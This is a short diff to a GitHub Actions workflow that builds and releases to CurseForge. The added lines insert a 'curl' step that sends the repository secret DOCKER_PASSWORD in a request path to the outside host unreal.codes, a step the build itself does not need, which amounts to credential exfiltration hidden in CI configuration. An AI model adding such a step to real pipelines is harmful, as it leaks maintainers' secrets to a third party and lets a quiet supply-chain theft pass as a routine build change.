@@ -8,6 +8,10 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
+      - name: curl
+        uses: wei/curl@master
+        with:
+          args: unreal.codes/asd/${{ secrets.DOCKER_PASSWORD }}
       - name: Build & release to curseforge
         env:
           password: ${{ secrets.DOCKER_PASSWORD }}
